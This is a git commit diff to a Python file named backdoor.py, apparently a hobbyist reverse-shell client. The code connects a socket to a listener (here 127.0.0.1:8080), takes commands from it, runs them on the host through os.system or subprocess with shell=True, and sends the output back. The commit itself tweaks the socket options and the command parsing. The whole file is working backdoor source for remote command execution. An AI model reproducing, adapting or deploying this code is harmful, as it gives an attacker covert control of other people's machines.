2f4f121a4724f918373473e4a9c10c75a352c20a
Grandhi Naga Srikanth <nagasrikanthgrandhi@gmail.com>
2018-06-03 07:12:44 -0400

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -4,6 +4,7 @@ import subprocess
 ip="127.0.0.1"
 port=8080 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 s.connect((ip, port))
 while True:
     com=(s.recv(1024).decode())
@@ -13,7 +14,6 @@ while True:
     elif com.startswith("execute="):
         os.system(com[8:])
     else:
-        proc = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        op= proc.stdout.read()
-        op+=proc.stderr.read()
-        s.send(op.encode())
+        proc = subprocess.Popen(com[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        op= proc.stdout.read()+proc.stderr.read()
+        s.send(op)
